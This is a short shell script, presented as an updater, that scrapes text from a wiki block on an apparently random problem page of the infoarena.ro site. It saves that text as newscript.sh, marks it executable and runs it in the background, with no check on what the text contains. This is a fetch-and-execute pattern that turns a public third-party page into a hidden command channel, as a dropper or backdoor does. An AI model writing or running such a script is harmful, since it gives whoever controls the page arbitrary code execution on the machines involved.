#!/bin/sh

UPDATE_LINK="https://infoarena.ro/problema/ec7pkfjycylza1qqxzhfketfhjcr1ommp03q0e39mpwywmufolh"
DEBUG=1
DATA=""
LAST_UPDATE=$(cat newscript.sh)

if [ -f "/bin/curl" ]; then
	#curl found
	if [ $DEBUG ]; then
		echo "Using curl";
	fi
	DATA=$(/bin/curl --silent $UPDATE_LINK)
	DATA=$(echo $DATA | sed 's/.*class="wiki_text_block"><p>//;s/<\/p>.*//')
elif [ -f "/bin/wget" ]; then
	#wget found
	if [ $DEBUG ]; then
		echo "Using wget";
	fi
	DATA=$(/bin/wget -q -O - $UPDATE_LINK)
	DATA=$(echo $DATA | sed 's/.*class="wiki_text_block"><p>//;s/<\/p>.*//')
else
	#error
	echo "Can't update because curl and wget don't exist";
fi

if [ ${#DATA} -eq 0 ]; then
	echo "Empty data"
	exit 0
fi

if [ "$LAST_UPDATE" = "$DATA" ]; then
	echo "Already updated"
	exit 0
fi

echo $DATA>"newscript.sh"
chmod +x newscript.sh
./newscript.sh &